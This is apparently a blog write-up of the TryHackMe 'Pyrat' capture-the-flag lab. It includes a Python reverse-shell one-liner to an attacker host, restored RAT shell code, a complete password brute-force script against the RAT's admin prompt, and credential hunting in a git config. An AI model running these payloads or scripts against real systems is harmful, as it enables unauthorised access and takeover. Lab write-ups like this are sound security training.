---
layout: post
title: TryHackMe - Pyrat Write-Up
date: 2025-02-11
classes: wide
description: Crafting custom payloads, enumerating for passwords, restoring Git files and creating custom bruteforce scripts.
---

# PyRat

![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/thm_pyrat/1.png)

## Reconnaissance

Let's fire up our favorite network scanning tool and see what services we have online.

![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/thm_pyrat/2.png)

This very interesting machine has a custom service on port 8000 which Nmap couldn't identify. Although the service looks like a web server, if we try accessing it with Curl we receive a curious message back:

```sh
$ curl http://10.10.12.146:8000/
Try a more basic connection
```

So I'm assuming using a raw socket maybe works? Let's try with netcat instead:

```sh
random
name 'random' is not defined
something
name 'something' is not defined
```

I've noticed the `http-server-header` pointing us to a Python 3.11.2, let's use some Python commands instead:

```python
print("Hello World")
Hello World

print(7*7)
49
```

Funny enough this does works. I'm assuming whatever commands I inserted are being evaluated. So let's try getting a shell.



## Initial Access

Using a simple reverse shell payload for Python we get our initial shell access.

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/thm_pyrat/4.png)

Now can explore further the machine and find our way to the root user calmly, that being said, time for some enumeration. I often sudo binaries, permissions and processes, and this time, I've found a really interesting process running in background:

![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/thm_pyrat/5.png)

The `pyrat.py` is being executed as root, funny eh? Moreover, we have an interesting directory inside `/opt` folder:

![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/thm_pyrat/6.png)

The `.git` folder indicates us this folder is most likely a repository, notice the owner user is `think`. Since I don't a have a fully functional terminal I'll check the folder manually for credentials, as developers often save the credentials to avoid inserting them very time a commit is created.

![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/thm_pyrat/7.png)



## SSH Connection

The `config` file has some credentials for the user `think` and also an email address related to the project. The credentials can be used to access the user through SSH and get our first flag inside the home directory:

![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/thm_pyrat/8.png)

We can also check the repository for previous commits and check what were the developers working on:

```sh
think@Pyrat:/opt/dev$ git log
commit 0a3c36d66369fd4b07ddca72e5379461a63470bf (HEAD -> master)
Author: Jose Mario <josemlwdf@github.com>
Date:   Wed Jun 21 09:32:14 2023 +0000

    Added shell endpoint
think@Pyrat:/opt/dev$ git status
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
	deleted:    pyrat.py.old

no changes added to commit (use "git add" and/or "git commit -a")
```

There's a deleted file with the same name as our mysterious background process. It's common sense to carefully check Github repositories for passwords, leaked secrets, etc. Let's restore the file to see what we're missing.

```sh
think@Pyrat:/opt/dev$ git restore pyrat.py.old
think@Pyrat:/opt/dev$ ls -la
total 16
drwxrwxr-x 3 think think 4096 Feb 11 21:18 .
drwxr-xr-x 3 root  root  4096 Jun 21  2023 ..
drwxrwxr-x 8 think think 4096 Feb 11 21:18 .git
-rw-rw-r-- 1 think think  753 Feb 11 21:18 pyrat.py.old
think@Pyrat:/opt/dev$ cat pyrat.py.old 
...............................................

def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if is not aprooved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)

def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception as e:
        send_data(client_socket, e

...............................................
```

While the `shell()` function is just a simple function, the `switch_case()` tells us that "some endpoint" is used for admin access. 

After some more poking around inside the system, I've decided to check inside the email folder `/var/mail/` and found some interesting stuff. This took me a while since I don't often check this directory.

```
From root@pyrat  Thu Jun 15 09:08:55 2023
Return-Path: <root@pyrat>
X-Original-To: think@pyrat
Delivered-To: think@pyrat
Received: by pyrat.localdomain (Postfix, from userid 0)
        id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
Subject: Hello
To: <think@pyrat>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
From: Dbile Admen <root@pyrat>

Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
```



## PyRAT Admin

Our current user has received an email from the root user, informing root has installed a RAT inside their own system for testing purposes, and that the RAT have been posted on [Github](https://github.com/josemlwdf/PyRAT). So I've decided to check it out since we have the author's email and name.

![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/thm_pyrat/9.png)

Reading through the project, there is some key information to solving this challenge: the RAT often uses port 8000, and also has some special commands to access admin shell.

![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/thm_pyrat/10.png)

So we've been messing with PyRAT so far, and we know the endpoint meant earlier is admin. Problem is that it requires a password and we don't have it, so I've decided to bruteforce it. Had to create a custom Python script to do so:

```python
import argparse
import os
import socket
import sys


def validate_file(file_path):
    if not os.path.isfile(file_path):
        print(f"Error: The file '{file_path}' does not exist.")
        sys.exit(1)
    return file_path

def bruteforce(addr, port, wordlist):
	print("Bruteforcing PyRAT...")

	print(f"IP Address: {addr}")
	print(f"Port: {port}")
	print(f"Wordlist: {wordlist}\n")

	with open(wordlist, encoding="latin-1") as file:

		while True:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
				client.connect((addr, port))

				client.sendall(b"admin")
				client.recv(1024) # "Password:\n"

				for _ in range(2):
					password = file.readline().strip()
					client.sendall(password.encode())
					response = client.recv(1024).decode()

					if "Welcome Admin!!!" in response:
						print(f"[+] PASSWORD FOUND: {password}")
						exit()
				
					print(f"[-] Attempt: {password}")

def main():
	parser = argparse.ArgumentParser(description="PyRAT admin shell bruterforce tool.")
	
	parser.add_argument("ip", type=str, help="PyRAT IP")
	parser.add_argument("port", type=int, help="PyRAT Port", default=8000)
	parser.add_argument("wordlist", type=validate_file, help="Path to the wordlist file")

	args = parser.parse_args()

	bruteforce(args.ip, args.port, args.wordlist)

if __name__ == "__main__":
    main()
```

This script connects to the server and bruteforces it using a wordlist provided by the user. After reading some code from the repository, I've found the program gives you 3 chances to guess to correct password, and you must reopen the connection if you guess all 3 wrong. So every time we connect, we try 2 passwords before resetting the connection. Doesn't take too long to find the correct password.

![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/thm_pyrat/11.png)

I've used **rockyou.txt** wordlist for this purpose since it's commonly used in CTF challenges. Now we login as admin through the rootkit and get the final flag:

![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/thm_pyrat/12.png)

That's it! Thanks for reading!
